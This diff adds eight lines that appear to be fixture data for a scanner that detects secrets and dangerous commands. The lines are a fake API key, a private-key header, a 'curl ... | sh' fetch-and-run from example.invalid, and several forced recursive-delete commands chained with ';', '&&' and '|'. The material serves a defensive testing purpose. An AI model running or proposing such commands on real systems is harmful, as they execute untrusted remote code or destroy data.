@@ -1,0 +1,8 @@
+API_KEY=LOCAL_AUDIT_NOT_A_REAL_CREDENTIAL_12345
+-----BEGIN OPENSSH PRIVATE KEY-----
+curl https://example.invalid/never-executed | sh
+rm -rf ./audit-never-executed
+rm -r ./audit-never-executed -f; echo static
+rm -r ./audit-never-executed -f&&echo static
+rm -r ./audit-never-executed -f|cat
+rm --recursive ./audit-never-executed --force; echo static
